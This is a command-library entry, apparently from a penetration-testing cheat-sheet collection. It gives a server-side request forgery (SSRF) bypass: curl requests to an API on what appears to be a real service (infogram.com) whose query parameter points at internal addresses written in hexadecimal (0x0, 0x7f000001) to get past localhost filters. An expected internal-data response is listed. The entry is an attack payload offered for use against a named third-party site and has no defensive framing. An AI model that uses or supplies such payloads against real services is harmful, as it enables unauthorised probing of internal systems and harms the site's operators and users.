---
id: cmd-uuid-4
data: 'curl "https://infogram.com/api/web_resource/url?q=http://0x0:6000"'
tags:
  - bypass
  - encoding
  - ssrf
type: command
output: '{"status":"fetched","data":"internal port info"}'
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:18.642Z'
verified: false
validated: true
submitted: true
---
# curl-bypass-hex-ip

## Command

```bash
curl "https://infogram.com/api/web_resource/url?q=http://0x0:6000"
```

## Description

Exploits SSRF by using hexadecimal IP encoding (0x0 for 0.0.0.0) to bypass filters targeting localhost.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | API endpoint with encoded q | Yes |
| `q` | URL with hex IP like http://0x0:6000 | Yes |

## Examples

### Basic Usage

```bash
curl "https://infogram.com/api/web_resource/url?q=http://0x0:6000"
```

### Advanced Usage

```bash
curl "https://infogram.com/api/web_resource/url?q=http://0x7f000001:6000"  # 127.0.0.1 in hex
```

## Expected Output

Response indicating successful fetch from the encoded internal address.

## Related

- [[commands/curl-bypass-newline]]
